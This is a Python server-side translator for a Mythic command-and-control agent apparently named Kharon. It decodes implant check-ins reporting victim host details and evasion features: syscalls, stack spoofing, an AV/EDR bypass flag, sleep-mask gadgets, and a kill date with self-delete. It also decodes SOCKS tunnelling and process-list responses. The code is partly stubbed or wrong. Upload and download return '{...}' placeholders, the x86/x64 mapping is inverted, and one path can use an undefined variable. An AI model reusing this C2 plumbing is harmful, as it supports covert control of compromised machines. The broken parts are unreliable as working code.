from Translator.Utils import *
from mythic_container.MythicRPC import *
import ipaddress

async def CheckinC2(Data) -> dict:
    Psr = Parser(Data, len(Data))

    UUID = Psr.Pad(36)
    StorageData = Psr.buffer

    OsName = "Windows"
    OsArch = Psr.Pad(1)
    OscArc = ""

    if isinstance(OsArch, bytes):
        OsArch = int.from_bytes(OsArch, byteorder='big', signed=False)

    if OsArch == 0x64:
        OscArc = "x64"
    elif OsArch == 0x86:
        OscArc = "x86"

    # Basic system info
    UserName = Psr.Str()
    HostName = Psr.Str()
    Netbios = Psr.Str()
    ProcessID = Psr.Int32()
    ImagePath = Psr.Str()
    InternIp = ["0.0.0.0"]

    print(f"[*] Basic Info:")
    print(f"    Username: {UserName}")
    print(f"    Hostname: {HostName}")
    print(f"    NetBIOS: {Netbios}")
    print(f"    Process ID: {ProcessID}")
    print(f"    Image Path: {ImagePath}")
    print(f"    Internal IP: {InternIp}")

    # Security features
    syscall_enabled = Psr.Int32()
    stack_spoof_enabled = Psr.Int32()
    bof_hook_api_enabled = Psr.Int32()
    bypass_enabled = Psr.Int32()
    
    print(f"\n[*] Security Features:")
    print(f"    Syscall Enabled: {bool(syscall_enabled)}")
    print(f"    Stack Spoofing: {bool(stack_spoof_enabled)}")
    print(f"    BOF Hook API: {bool(bof_hook_api_enabled)}")
    print(f"    Bypass Enabled: {bool(bypass_enabled)}")

    # Killdate info
    killdate_enabled = Psr.Int32()
    killdate_exit_method = Psr.Int32()
    killdate_selfdelete = Psr.Int32()
    killdate_year = Psr.Int16()
    killdate_month = Psr.Int16()
    killdate_day = Psr.Int16()

    print(f"\n[*] Killdate Info:")
    print(f"    Enabled: {bool(killdate_enabled)}")
    print(f"    Exit Method: {killdate_exit_method}")
    print(f"    Self Delete: {bool(killdate_selfdelete)}")
    print(f"    Date: {killdate_year}-{killdate_month:02d}-{killdate_day:02d}")

    # Process info
    command_line = Psr.Str()
    heap_address = Psr.Int32()
    elevated = Psr.Int32()
    jitter = Psr.Int32()
    sleep_time = Psr.Int32()
    parent_id = Psr.Int32()
    process_arch = Psr.Int32()
    kharon_base = Psr.Int64()
    kharon_len = Psr.Int32()
    thread_id = Psr.Int32()

    print(f"\n[*] Process Info:")
    print(f"    Command Line: {command_line}")
    print(f"    Heap Address: 0x{heap_address:08X}")
    print(f"    Elevated: {bool(elevated)}")
    print(f"    Jitter: {jitter}%")
    print(f"    Sleep Time: {sleep_time}ms")
    print(f"    Parent ID: {parent_id}")
    print(f"    Process Arch: {process_arch}")
    print(f"    Kharon Base: 0x{kharon_base:016X}")
    print(f"    Kharon Length: {kharon_len}")
    print(f"    Thread ID: {thread_id}")

    # Mask info
    mask_jmp_gadget = Psr.Int64()
    mask_ntcontinue_gadget = Psr.Int64()
    mask_technique_id = Psr.Int32()

    print(f"\n[*] Mask Info:")
    print(f"    JMP Gadget: 0x{mask_jmp_gadget:016X}")
    print(f"    NtContinue Gadget: 0x{mask_ntcontinue_gadget:016X}")
    print(f"    Technique ID: {mask_technique_id}")

    # Process context
    process_ctx_parent = Psr.Int32()
    process_ctx_pipe = Psr.Int32()
    process_ctx_curdir = Psr.Str()
    process_blockdlls = Psr.Int32()
    

    print(f"\n[*] Process Context:")
    print(f"    Parent: {process_ctx_parent}")
    print(f"    Pipe: {process_ctx_pipe}")
    print(f"    Current Dir: {process_ctx_curdir}")
    print(f"    Block DLLs: {bool(process_blockdlls)}")

    # System resources
    processor_name = Psr.Str()
    total_ram = Psr.Int32()
    aval_ram = Psr.Int32()
    used_ram = Psr.Int32()
    percent_ram = Psr.Int32()
    processors_nbr = Psr.Int32()

    print(f"\n[*] System Resources:")
    print(f"    Processor: {processor_name}")
    print(f"    Total RAM: {total_ram}MB")
    print(f"    Available RAM: {aval_ram}MB")
    print(f"    Used RAM: {used_ram}MB")
    print(f"    RAM Usage: {percent_ram}%")
    print(f"    Processor Count: {processors_nbr}")

    await SendMythicRPCAgentStorageCreate(MythicRPCAgentstorageCreateMessage(
        UUID.decode("utf-8"), StorageData
    ))

    search_resp: MythicRPCAgentStorageSearchMessageResponse = await SendMythicRPCAgentStorageSearch(MythicRPCAgentStorageSearchMessage(
        UUID.decode("utf-8")
    ))

    if search_resp.Success:
        print(search_resp.AgentStorageMessages)

    JsonData = {
        "action": "checkin",
        "ips": InternIp,
        "os": OsName,
        "user": UserName,
        "host": HostName,
        "domain": Netbios,
        "process_name":ImagePath,
        "pid": ProcessID,
        "uuid": UUID.decode('cp850'),
        "architecture": OscArc,
    };

    Dbg4( f"checkin json: {JsonData} arch {OsArch}" );

    return JsonData;

def GetTaskingC2( Data ):
    Dbg5( "------------------------" );

    JsonData = { "action": "get_tasking", "tasking_size": -1 };

    Dbg5( f"getting all tasks" );

    Dbg5( "------------------------" );

    return JsonData

def PostC2(Data):
    Dbg2("------------------------")
    RespTsk = [] 
    RespSck = []

    Psr = Parser(Data, len(Data))
    Tasks = Psr.Int32()
    Dbg2(f"Task quantity: {Tasks}")

    for Task in range(Tasks):
        TaskLength = Psr.Int32()
        TaskData   = Psr.Pad(TaskLength)
        TaskPsr    = Parser(TaskData, TaskLength)
        
        TaskUUID = TaskPsr.Bytes().replace(b'\x00', b'')
        try:
            TaskUUID = TaskUUID.decode('utf-8')
        except UnicodeDecodeError:
            TaskUUID = TaskUUID.hex()
        
        CommandID = TaskPsr.Pad(2)
        CommandID = int.from_bytes(CommandID, byteorder="big")

        if CommandID == T_SOCKS:
            Ext = TaskPsr.Int32()
            Srv = TaskPsr.Int32()
            
            if TaskPsr.buffer is not None:
                Data = TaskPsr.Bytes()
                Data = base64.b64encode( Data ).decode( "utf-8" )
            else:
                Data = ""
            
            SocksData = {
                "exit": bool(Ext),
                "server_id": Srv,
                "data": Data 
            }
            RespSck.append(SocksData)
        else:
            JsonTsk = process_normal_task(TaskUUID, CommandID, TaskPsr)
            RespTsk.append(JsonTsk)

    JsonData = {
        "action": "post_response",
        "responses": RespTsk,
    }

    if RespSck:
        JsonData["socks"] = RespSck

    Dbg2(f"command id: {CommandID}")

    Dbg2(f"JSON data: {JsonData}")
    Dbg2("------------------------")
    return JsonData

def process_normal_task(TaskUUID, CommandID, TaskPsr:Parser):
    if CommandID == T_DOWNLOAD:
        return {"task_id": TaskUUID, "download": {...}}
    elif CommandID == T_UPLOAD:
        return {"task_id": TaskUUID, "upload": {...}}
    elif CommandID == T_PROCESS:
        psr_backup = Parser( TaskPsr.buffer, TaskPsr.length );

        RawBytes = psr_backup.All()
        Output   = RawBytes.hex()
        
        processes = []

        sub_id = int.from_bytes( TaskPsr.Pad(1), byteorder="big" )

        if sub_id == SB_PS_LIST:
            while TaskPsr.buffer and TaskPsr.length > 0:

                ImagePath = TaskPsr.Str()
                ImageName = TaskPsr.Wstr()
                CommandLn = TaskPsr.Wstr()
                ProcessID = TaskPsr.Int32()
                ParentID  = TaskPsr.Int32()
                HandleCnt = TaskPsr.Int32()
                SessionID = TaskPsr.Int32()
                ThreadNbr = TaskPsr.Int32()
                TokenUser = TaskPsr.Str()
                Isx64     = TaskPsr.Int32()

                process = {
                    "process_id": ProcessID,
                    "name": ImageName,
                    "host": "",
                    "parent_process_id": ParentID,
                    "architecture": "x86" if Isx64 else "x64",
                    "bin_path": ImagePath,
                    "user": TokenUser,
                    "command_line": CommandLn                    
                }

                processes.append( process )

        return {"task_id": TaskUUID, "process_response": Output, "processes": processes, "completed": True }
    elif CommandID == JOB_ERROR:
        ErrorCode = TaskPsr.Int32()
        ErrorMsg  = TaskPsr.Bytes().decode("utf-8")  

        if ErrorCode < 0:
            hex_code = f"{ErrorCode & 0xFFFFFFFF:X}" 
            Output   = f"({hex_code}) {ErrorMsg}"
        else:
            Output = f"({ErrorCode}) {ErrorMsg}"
        return {"task_id": TaskUUID, "user_output": Output, "completed": True}
    else:
        try:
            RawBytes = TaskPsr.All()
            Output   = RawBytes.hex()
        except Exception as e:
            Dbg2( f"failed get raw argument from agent: {e}" )
        return {"task_id": TaskUUID, "process_response": Output, "completed": True}
    
    